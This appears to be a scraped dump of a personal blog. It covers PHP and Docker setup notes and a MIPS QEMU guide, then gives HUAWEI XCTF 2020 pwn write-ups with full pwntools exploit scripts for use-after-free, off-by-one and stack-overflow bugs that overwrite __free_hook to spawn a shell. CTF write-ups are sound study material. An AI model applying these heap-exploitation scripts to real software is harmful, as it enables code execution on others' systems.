www.php.net\n特点php是免费的\n效率高: php消耗相当少的系统资源\n易学易用，功能强大\n跨平台\n嵌入HTML\n面向对象\n运行环境WAMP: windows + apache + mysql + php\nWNMP: windows + nginx + mysql + php\nLAMP: linux + apache + mysql + php\nLNMP: linux + nginx + mysql + php\n官方网站php: http://www.php.net\nmysql: http://www.mysql.com\napache: http://www.apache.org\nwindows下:\n推荐软件: phpstudy\n网址: https://ww.xp.cn\n推荐软件2: appsrv-win32\n网址: http://www.appservnetwork.com\nlinux下:\n\n宝塔\n\n(appceh&#x2F;nginx, mysql, php)单独安装\n\nphpstudy-linux面板\n\n\nVSCode装饰特效安装 Power Mode\n设置中搜索setting.json,添加如下:\n&#123;&quot;powermode.enabled&quot;: true,&quot;powermode.enableShake&quot; : false,&quot;powermode.presets&quot;: &quot;particles&quot;&#125;\n\nLinux下环境搭建:httpd + php + mysql\nsudo vim /etc/httpd/conf/httpd.conf\n\n添加php模块到httpd中\n编辑 &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf 文件时要注意：\n找到：AddType application&#x2F;x-compress .ZAddType application&#x2F;x-gzip .gz .tgz在后面添加：\nAddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps\n\n找到：  DirectoryIndex index.html 添加： \n&lt;IfModule dir_module&gt; DirectoryIndex index.html index.php &lt;/IfModule&gt;\n\n找到： ＃ServerName www.example.com:80修改为： ServerName 127.0.0.1:80或者ServerName localhost:80 记得要去掉前面的“＃”\n修改默认的Web站点目录\n找到：DocumentRoot “&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs”修改为：DocumentRoot “&#x2F;home&#x2F;www&#x2F;WebSite” –该目录为自己创建的目录\n找到：&lt;Directory “&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs”&gt;修改为：&lt;Directory “&#x2F;home&#x2F;www&#x2F;WebSite”&gt;\nhttps://www.jianshu.com/p/c36dd3946e74\nDockerdocker pull nginxdocker pull php:fpm\n\n\n\n指定宿主机目录让 nginx 配置挂载宿主机文件借助 -v 参数，我们在宿主机新增一个目录存放 nginx 配置，然后指定容器 nginx 配置目录挂载到宿主机在执行命令之前，我们先写好一个配置\nserver &#123;    root /usr/share/nginx/www;    index  index.html index.php;    server_name localhost;    error_log  /var/log/nginx/error.log;    access_log /var/log/nginx/access.log;     location ~ \\.php$ &#123;        fastcgi_pass 127.0.0.1:9000;        fastcgi_index index.php;        include fastcgi_params;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        fastcgi_param PATH_INFO $fastcgi_path_info;    &#125;&#125;\n\n运行\ndocker run \\--rm \\--name php-nginx \\-p 8080:80 \\-v /home/i0gan/php/www:/usr/share/nginx/www \\-v /home/i0gan/php/conf/nginx:/etc/nginx/conf.d \\nginx\n\n\n\n在 www 新增一个 php 文件\n&lt;?php\tphpinfo();?&gt;\n\n\n\ndocker run \\--rm \\--name php-fpm \\php:fpm \\\n\n\n\nhttps://juejin.cn/post/6844903914211393550\nPHP代码标记在php历史发展中，可以使用多种标记来区分php脚本\nasp标记: &lt;% php代码 %&gt;\n短标记: \n以上两种已经弃用，如果要使用那么需要在配置文件中开启\n脚本标记:  php代码 \n&lt;html&gt;&lt;body&gt;\t&lt;b&gt;\t\t&lt;script language=&quot;php&quot;&gt;\t\techo &quot;hello world&quot;;\t\t&lt;/script&gt;\t&lt;/b&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\n标准标记: \n&lt;html&gt;&lt;body&gt;\t&lt;b&gt;\t\t&lt;?php\t\techo(&quot;hello world\\n&quot;);\t\t?&gt;        asdfasdfasd\t&lt;/b&gt;&lt;/body&gt;&lt;/html&gt;\n\n注释&#x2F;&#x2F;: 后面所跟的内容全部都是注释\n#: 与 &#x2F;&#x2F;一样\n&#x2F;**&#x2F;\n语句分割符;\n变量变量的使用$var; //定义变量$var2 = 1; //定义并赋值unset($var2) // 删除变量\n\n预定义变量都是数组\n$_GET\n$_POST\n$_REQUEST\n$_GLOBALS\n$_SERVER\n$_SESSION\n$_COOKIE\n$_ENV\n$_FILES\n可变变量如果一个变量保存的值刚好是另一个变量的名字，那么可以直接通过访问一个变量得到另一个变量的值:在变量前面再多加一个$符号\n$a = &#x27;b&#x27;;$b = &#x27;bb&#x27;;echo $$a;\n\n\n\n","categories":["language"],"tags":["php"]},{"title":"Docker-镜像以及容器管理","url":"/2021/01/24/env/docker/docker_con_save/","content":"Docker - 镜像以及容器管理Docker将容器打包成镜像，体积远小于其他虚拟化软件，可以更快的分发部署，轻量级的容器和镜像结构发挥了巨大作用。\n一、保存容器更改Docker镜像的本质是多个基于UnionFS的镜像层依次挂载的结果，而容器的文件系统则是在以只读方式挂载镜像后增加的一个可读可写的沙盒环境。\n基于镜像结构，Docker提供了将容器中的这个可读可写的沙盒环境持久化为一个镜像层的方法。能够很轻松的在Docker里将容器内的修改记录下来，保存为一个新的镜像。\n通过docker commit命令，可以将容器修改的内容保存为镜像，由于镜像的结构很像代码仓库里的修改记录，而记录容器修改的过程又像是在提交代码，所以可以更形象的称之为提交容器的更改。\ndocker commit webappsha256:0bc42f7ff218029c6c4199ab5c75ab83aeaaed3b5c731f715a3e807dda61d19e\n\nDocker将容器内沙盒文件系统记录成镜像层的时候，会先暂停容器的运行，以保证容器内的文件系统处于一个相对稳定的状态，确保数据的一致性。\n提交镜像更新后，可以得到Docker创建的新镜像的ID，可以本地镜像列表中找到它。\ndocker imagesREPOSITORY            TAG                 IMAGE ID            CREATED             SIZE&lt;none&gt;                &lt;none&gt;              0bc42f7ff218        3 seconds ago       372MB\n\n类似通过Git提交代码一样，还能在提交容器更改时附加提交信息，方便以后查询。\ndocker commit -m &quot;configured&quot; webapp\n\n二、镜像命名提交容器更新后产生的镜像并没REPOSITORY和TAG内容，新的镜像还没有名字。\n通过docker tag命令，能够为未命名的镜像指定镜像名，也能够对已有的镜像创建一个新的命名。\ndocker tag 0bc42f7ff218 webapp:1.0docker tag webapp:1.0 webapp:latest\n\n对未命名的镜像进行命名后，Docker就不会在镜像列表里继续显示这个镜像，取而代之的是新的命名。\ndocker imagesREPOSITORY            TAG                 IMAGE ID            CREATED             SIZEwebapp                1.0                 0bc42f7ff218        29 minutes ago      372MBwebapp                latest              0bc42f7ff218        29 minutes ago      372MB\n\n由于镜像是对镜像层的引用记录，所以对镜像进行命名后，能够在镜像列表里同时看到新老两个镜像，实质是它们其实引用着相同的镜像层，这个能够从镜像ID中看得出来。\n除了使用docker tag在容器提交为新的镜像后为镜像命名这种方式外，还可以直接在docker commit命令里指定新的镜像名，这种方式在使用容器提交时更加方便。\ndocker commit -m &quot;upgrade&quot; webapp webapp：2.0\n\n三、镜像迁移将更新导出为镜像后，就可以开始镜像迁移。\n由于Docker以集中的方式管理镜像的，所以在迁移之前，需要先从Docker中取出镜像。docker save命令可以将镜像输出，提供了保存镜像到Docker外部的方式。\ndocker save webapp:1.0 &gt; webapp-1.0.tar\n\n默认定义下，docker save命令会将镜像内容放入输出流中，这种用法有时不太友好，docker save命令还提供了**-o**选项，用来指定输出文件，使用这个选项可以让命令更具有统一性。\ndocker save -o ./webapp-1.0.tar webapp:1.0\n\n镜像导出之后可以找到已经存储镜像内容的webapp-1.0.tar文件。通过解压软件查看其中的内容，会看到里面就是镜像所基于的几个镜像层的记录文件。\n四、导入镜像可以通过很多种方式将导出的镜像文件复制到另一台机器上，之后将镜像导入到新机器中运行的Docker中。使用与docker save相对的docker load命令即可。\ndocker load &lt; webapp-1.0.tar\n\ndocker load从输入流中读取镜像的数据，也能够使用**-i**选项指定输入文件。\ndocker load -i webapp-1.0.tar\n\n镜像导入后，就可以通过docker images看到，导入的镜像会延用原有的镜像名称。\n五、批量迁移通过docker save和docker load命令还能够批量迁移镜像，只要在docker save中传入多个镜像名作为参数，它就能够将这些镜像都打成一个包，便于一次性迁移多个镜像。\ndocker save -o ./images.tar webapp:1.0 nginx:1.12 mysql:5.7\n\n装有多个镜像的包可以直接被docker load识别和读取，将这个包导入后，其中所有镜像都会被导入到Docker之中。\n六、导出和导入容器提交镜像修改，再导出镜像进行迁移的方法还不够效率，使用docker export命令可以直接导出容器，把它简单的理解为docker commit与docker save的结合体。\ndocker export -o ./webapp.tar webapp\n\n相对的，使用docker export导出的容器包，需要使用docker import导入，导入的结果还是一个镜像，而不是容器。\n","categories":["env"],"tags":["docker"]},{"title":"Docker配置源","url":"/2021/01/17/env/docker/source/","content":"Docker配置源国内的镜像源有\n\ndocker官方中国区 https://registry.docker-cn.com\n网易 http://hub-mirror.c.163.com\nustc http://docker.mirrors.ustc.edu.cn\n阿里云 http://&lt;你的ID&gt;.mirror.aliyuncs.com\n\n注意registry-mirrors千万不要用https，而是用http，否则会显示No certs for egitstry.docker.com， insecure-registries不要任何http头，否则无法通过。\n通用的方法就是编辑/etc/docker/daemon.json：\n&#123;  &quot;registry-mirrors&quot; : [    &quot;http://ovfftd6p.mirror.aliyuncs.com&quot;,    &quot;http://registry.docker-cn.com&quot;,    &quot;http://docker.mirrors.ustc.edu.cn&quot;,    &quot;http://hub-mirror.c.163.com&quot;  ],  &quot;insecure-registries&quot; : [    &quot;registry.docker-cn.com&quot;,    &quot;docker.mirrors.ustc.edu.cn&quot;  ],  &quot;debug&quot; : true,  &quot;experimental&quot; : true&#125;","categories":["env"],"tags":["docker"]},{"title":"MIPS Qemu环境搭建","url":"/2021/01/15/security/pwn/mips/mips_env/","content":"MIPS 环境搭建安装 与 配置 Qemu:apt-get install qemu apt-get install qemu-user-staticapt-get install qemu-systemapt-get install uml-utilitiesapt-get install bridge-utils\n\n配置网络方法一创建网桥，名字是 virbr0\nsudo brctl added virbr0sudo ifconfig virbr0 192.168.122.1/24 up\n\n创建 tap 接口，名字为 tap0，并添加到网桥\nsudo tunctl -t tap0sudo ifconfig tap0 192.168.122.11/24 upsudo brctl addif virbr0 tap0\n\n然后运行\nsudo qemu-system-mips -M malta -kernel mips_vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic\n\n然后在 虚拟机里面设置 ip\nsudo ifconfig eth0 192.168.122.12/24 up\n\n来源\nhttps://blog.csdn.net/RichardYSteven/article/details/54807927\n\n\n\nIssueChecksec file: uhttpd[!] Could not populate MIPS GOT: seek out of range[!] Did not find any GOT entries[*] &#x27;/run/media/i0gan/disk1/share/route_pwn/run/uhttpd&#x27;    Arch:     mips-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments    $ qemu-mips uhttpd qemu-mips: uhttpd: Invalid ELF image for this architecture\n\nAnwser:\nIt seems your binaries are little-endian, so you neeed qemu-mipsel.\nref: https://xz.aliyun.com/t/1508 \n","categories":["security"],"tags":["mips"]},{"title":"HUAWEI XCTF 2020 PWN WRITE UP","url":"/2021/01/08/security/ctf/compitation/wp-huawei-xctf-2020/","content":"HUAWEI XCTF 2020 PWN WRITE UPHUAWEI XCTF 2020 FirstCPPchecksecArch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\nUse the cutter decompiler to analize this program\nundefined8 main(void)&#123;    int64_t *piVar1;    int64_t iVar2;    undefined *arg1;    undefined *puVar3;    int64_t in_FS_OFFSET;    uint64_t uStack40;    int64_t iStack32;        iStack32 = *(int64_t *)(in_FS_OFFSET + 0x28);    setvbuf(_reloc.stdin, 0, 2, 0);    setvbuf(_reloc.stdout, 0, 2, 0);    setvbuf(_reloc.stderr, 0, 2, 0);    uStack40 = 0;    while( true ) &#123;        while( true ) &#123;                        std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::__ostream_insert&lt;char, std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*, long)                      (reloc.std::cout, 0x2004, 2);            uStack40 = 0x539;            std::istream&amp; std::istream::_M_extract&lt;unsigned long&gt;(unsigned long&amp;)(reloc.std::cin, &amp;uStack40);            if (uStack40 != 0) break;            arg1 = (undefined *)operator new[](unsigned long)(8);            puVar3 = arg1;            do &#123;                *puVar3 = 0;                puVar3 = puVar3 + 1;            &#125; while (puVar3 != arg1 + 8);                        std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)                      (reloc.std::cout, 0x2004);            fcn.000012c9((int64_t)arg1, 8);                        std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)                      (reloc.std::cout, 0x2004);            std::istream&amp; std::istream::_M_extract&lt;unsigned long&gt;(unsigned long&amp;)(reloc.std::cin, &amp;uStack40);            if (uStack40 &lt; 0x100) &#123;                piVar1 = (int64_t *)(uStack40 * 8 + 0x42e0);                iVar2 = *piVar1;                *piVar1 = (int64_t)arg1;                if (iVar2 != 0) &#123;                    operator delete[](void*)();                &#125;            &#125; else &#123;                operator delete[](void*)(arg1);            &#125;        &#125;        if (uStack40 != 1) break;                std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)                  (reloc.std::cout, 0x2004);        std::istream&amp; std::istream::_M_extract&lt;unsigned long&gt;(unsigned long&amp;)(reloc.std::cin, &amp;uStack40);        if (uStack40 &lt; 0x100) &#123;            piVar1 = (int64_t *)(uStack40 * 8 + 0x42e0);            iVar2 = *piVar1;            *piVar1 = 0;            if (iVar2 != 0) &#123;                operator delete[](void*)(iVar2);                puts(iVar2);                                std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)                          (reloc.std::cout, 0x2004);                fcn.000012c9(iVar2, 8);            &#125;        &#125;    &#125;    if (iStack32 == *(int64_t *)(in_FS_OFFSET + 0x28)) &#123;        return 0;    &#125;    // WARNING: Subroutine does not return    __stack_chk_fail();&#125;\n\nIt’s easy to discover the vulnerability is uaf\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;chall&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;124.70.12.210&quot;server_port = 10002# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def fn1(d, idx):\tsla(&#x27;&gt;&#x27;, &#x27;0&#x27;)\tsla(&#x27;&gt;&#x27;, d)\tsla(&#x27;&gt;&#x27;, str(idx))def fn2(idx, d):\tsla(&#x27;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;&gt;&#x27;, str(idx))\tsla(&#x27;&gt;&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t# leak heap\tfn1(&#x27;123&#x27;, 0x11)\tfn1(&#x27;123&#x27;, 0x12)\tfn2(0x11, &#x27;AAA&#x27;)\tsla(&#x27;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;&gt;&#x27;, str(0x12))\tleak = u64(ru(&#x27;\\x0a&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))\theap_base = leak - 0x11eb0\theap = leak\tli(&#x27;leak: &#x27; + hex(leak))\t#li(&#x27;heap: &#x27; + hex(heap))\tsla(&#x27;&gt;&#x27;, &#x27;&#x27;)\tfor i in range(0x30):\t\tfn1(&#x27;&#x27;, 0x10 + i)\t\tfn2(0x10, &#x27;BBBB&#x27;)\tfn2(0x12, p64(heap + 0x58)[0:7])\tfn1(&#x27;sh\\x00&#x27;, 0)\tfn1(p64(0x20 * 0x25 + 1)[0:7], 1)\tsla(&#x27;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;&gt;&#x27;, str(0x13))\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 96 - 0x10\t__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\t#one_gadget = libc_base + \tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tsla(&#x27;&gt;&#x27;, &#x27;&#x27;)\tfn2(0x20, &#x27;BBBB&#x27;)\tfn2(0x21, p64(__free_hook)[0:7])\t\tfn1(&#x27;&#x27;, 2)\tdb()\tfn1(p64(system), 3)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\telf = ELF(elf_path)\t\tlibc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\telse:\t\tlibc_path = &#x27;./libc.so.6&#x27;\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\nHUAWEI XCTF 2020 SecondhonorbookI’m not good at using gdb to debug this riscv architecture. Because this is the first time I’ve met this architecture. So I use c language to write a same function as this challenge, compile as amd64 arch to debug then analize the layout of heap. The vulnerability is off by one\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;void func();void menu();void init();void show();void del();void add();void modify();char *plist[30];char *pname[30];void init() &#123;\tsetvbuf(stdin, NULL, _IONBF, 0);\tsetvbuf(stdout, NULL, _IONBF, 0);&#125;void menu() &#123;\tstd::cout &lt;&lt; &quot;code:&quot;;&#125;void func() &#123;\tint a = 0;\twhile(1) &#123;\t\tmenu();\t\tstd::cin &gt;&gt; a; \t\tswitch(a) &#123;\t\t\tcase 1: add(); break;\t\t\tcase 2: del(); break;\t\t\tcase 3: show(); break;\t\t\tcase 4: modify(); break;\t\t\tdefault: \t\t\t\tputs(&quot;code err:&quot;);\t\t\t\tcontinue;\t\t&#125;\t&#125;&#125;void add() &#123;\tsize_t size = 0xe8;\tint idx;\tstd::cout &lt;&lt; &quot;idx:&quot;;\tstd::cin &gt;&gt; idx;    pname[idx] = new char[0x20];\tstd::cout &lt;&lt; &quot;name:&quot; &lt;&lt; std::endl;    read(0, pname[idx], 0x18);    \tplist[idx] = (char*)malloc(size);\tstd::cout &lt;&lt; &quot;msg:&quot;;\tfor(int i = 0; i &lt;= size; ++i) &#123;\t\tread(0, plist[idx] + i, 1);\t\tif(*(plist[idx] + i) == &#x27;\\n&#x27;)\t\t\tbreak;\t&#125;&#125;void del() &#123;\tint idx;\tstd::cout &lt;&lt; &quot;idx:&quot;;\tstd::cin &gt;&gt; idx;\tif(plist[idx] == nullptr) &#123;\t\treturn ;\t&#125;\tfree(plist[idx]);\tdelete[] pname[idx];\tpname[idx] = nullptr;\tplist[idx] = nullptr;&#125;void show() &#123;\tint idx;\t\tstd::cout &lt;&lt; &quot;idx:&quot;;\tstd::cin &gt;&gt; idx;\tif(plist[idx] == nullptr) &#123;\t\tstd::cout &lt;&lt; &quot;err&quot; &lt;&lt; std::endl;\t\treturn ;\t&#125;\tstd::cout &lt;&lt; &quot;msg:&quot; &lt;&lt; plist[idx] &lt;&lt; std::endl;&#125;void modify() &#123;\tint idx;\tstd::cout &lt;&lt; &quot;idx:&quot;;\tstd::cin &gt;&gt; idx;\tif(plist[idx] == nullptr) &#123;\t\treturn ;\t&#125;\tstd::cout &lt;&lt; &quot;msg:&quot;;\tsize_t size = 0xf8;\tfor(int i = 0; i &lt; size; ++i) &#123;\t\tread(0, plist[idx] + i, 1);\t\tif(*(plist[idx] + i) == &#x27;\\n&#x27;)\t\t\tbreak;\t&#125;&#125;int main(int, char**) &#123;    init();\tfunc();\treturn 0;&#125;\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;#context.arch=&#x27;em_riscv-64-little&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./honorbook&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;libs/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;121.36.192.114&quot;server_port = 9999# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(idx, n, d):\tsla(&#x27;:&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(idx))\tsa(&#x27;:&#x27;, n) # max 0x18\tsa(&#x27;:&#x27;, d) # max 0xE9def rm(idx):\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(idx))def dp(idx):\tsla(&#x27;:&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(idx))def md(idx, d):\tsla(&#x27;:&#x27;, &#x27;4&#x27;)\tsla(&#x27;:&#x27;, str(idx))\tsa(&#x27;:&#x27;, d) # max 0xE9#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t# name -&gt; size == 0x30\t# body -&gt; size == 0x100\t#ad(0, &#x27;A&#x27; * 0x18, &#x27;D&#x27; * 0xE9)\t# leak libc\tfor i in range(8):\t\tad(i, &#x27;A&#x27;, &#x27;\\n&#x27;)\tfor i in range(8):\t\trm(7 - i)\t\tfor i in range(7):\t\tad(i, &#x27;A&#x27;, &#x27;\\n&#x27;)\tad(7, &#x27;A&#x27;, &#x27;AAAAAAA\\n&#x27;)\tdp(7)\tru(&#x27;AA\\n&#x27;)\t#libc.sym[&#x27;__malloc_hook&#x27;]\tleak = u64(ru(&#x27;\\n&#x27;).ljust(8, b&#x27;\\x00&#x27;))\tlibc_base = 0x4000000000 + leak - libc.sym[&#x27;__malloc_hook&#x27;] - 88 - 0x10\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\t__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\trm(2)\trm(0)\tad(0, &#x27;A&#x27;, &#x27;A&#x27; * 0xe8 + &#x27;\\xf1&#x27;)\trm(1)\tp =  b&#x27;B&#x27; * 0x20\tp += p64(0) + p64(0xf1)\tp += p64(__free_hook) + p64(0)\tp += b&#x27;\\n&#x27;\tad(8, &#x27;A&#x27;, p)\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tli(&#x27;free_hook: &#x27; + hex(__free_hook))\tli(&#x27;system: &#x27; + hex(system))\tad(9, &#x27;/bin/sh\\x00&#x27;, &#x27;/bin/sh\\x00\\n&#x27;)\tad(10, &#x27;A&#x27;, p64(system) + b&#x27;\\n&#x27;)\trm(9)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\t#io = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\t\tio = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\t\t#io = process([&#x27;/usr/bin/qemu-riscv64-static&#x27;, &#x27;-g&#x27;, &#x27;1235&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\telse:\t\t\t#io = elf.process()\t\t\t#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\t\tio = process([&#x27;/usr/bin/qemu-riscv64-static&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\telse:\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n\n\nHUAWEI XCTF 2020 ThirdshellchecksecArch:     em_riscv-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX disabledPIE:      No PIE (0x10000)RWX:      Has RWX segments\n\nIt’s a riscv-64 arch, We have to use latest ghidra decompilier to annalize this program, version as: 9.21\nvulIn echo function, there is a stackoverflow vulnerability.\nvoid echo(longlong param_1)&#123;  longlong lVar1;  char **ppcVar2;  char *pcVar3;  char *__s2;  int iVar4;  ssize_t sVar5;  undefined4 extraout_var;  undefined4 extraout_var_00;  undefined4 extraout_var_01;  size_t __nbytes;  longlong lVar6;  undefined auStack320 [264];    lVar1 = *(longlong *)(param_1 + 8);  pcVar3 = *(char **)(lVar1 + 8);  iVar4 = strcmp(pcVar3,&quot;&gt;&quot;);  if (CONCAT44(extraout_var,iVar4) == 0) &#123;    lVar6 = 0;  &#125;  else &#123;    iVar4 = strcmp(pcVar3,&quot;&gt;&gt;&quot;);    lVar6 = 1;    if (CONCAT44(extraout_var_00,iVar4) != 0) &#123;                    /* WARNING: Subroutine does not return*/      error();    &#125;  &#125;  pcVar3 = *(char **)(lVar1 + 0x10);  ppcVar2 = (char **)&amp;gp0xfffffffffffffa60;  while ((__s2 = *ppcVar2, __s2 == (char *)0x0 ||         (iVar4 = strcmp(pcVar3,__s2),CONCAT44(extraout_var_01,iVar4) != 0))) &#123;    ppcVar2 = ppcVar2 + 1;    if (ppcVar2 == (char **)&amp;gp0xfffffffffffffbe0) &#123;      __nbytes = 0x200;LAB_00011516:      sVar5 = read(0,auStack320,__nbytes); // vul      FUN_000113e2(*(char **)(*(longlong *)(param_1 +8) + 0x10),auStack320,(longlong)sVar5,lVar6);      return;    &#125;  &#125;  __nbytes = *(size_t *)(__s2 + 0x18);  goto LAB_00011516;&#125;\n\n\n\nUse unsorted bin leak to leak libc address then use return-to-csu method to get shell\n                     LAB_0001181a                                    XREF[1]:     00011828(j)  0001181a 1c 60           c.ld       a5,0x0(s0=&gt;-&gt;_INIT_0)                            = 10F84h                                                                                     = 11056h0001181c 56 86           c.mv       a2,s50001181e d2 85           c.mv       a1,s400011820 4e 85           c.mv       a0,s300011822 85 04           c.addi     s1,0x100011824 82 97           c.jalr     a5=&gt;_INIT_0                                      undefined _INIT_1(void)                                                                                     undefined _INIT_0(void)00011826 21 04           c.addi     s0,0x800011828 e3 19 99 fe     bne        s2,s1,LAB_0001181a                     LAB_0001182c                                    XREF[1]:     0001180e(j)  0001182c e2 70           c.ldsp     ra,0x38(sp)0001182e 42 74           c.ldsp     s0,0x30(sp)00011830 a2 74           c.ldsp     s1,0x28(sp)00011832 02 79           c.ldsp     s2,0x20(sp)00011834 e2 69           c.ldsp     s3,0x18(sp)00011836 42 6a           c.ldsp     s4,0x10(sp)00011838 a2 6a           c.ldsp     s5,0x8(sp)0001183a 21 61           c.addi16sp sp,0x400001183c 82 80           ret\n\ngdb script#! /bin/shgdb-multiarch --nh \\        -ex &quot;add-symbol-file ./harmoshell&quot; \\        -ex &quot;set architecture riscv:rv64&quot; \\        -ex &quot;target remote 127.0.0.1:1234&quot;\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./harmoshell&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;libs/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;121.36.192.114&quot;server_port = 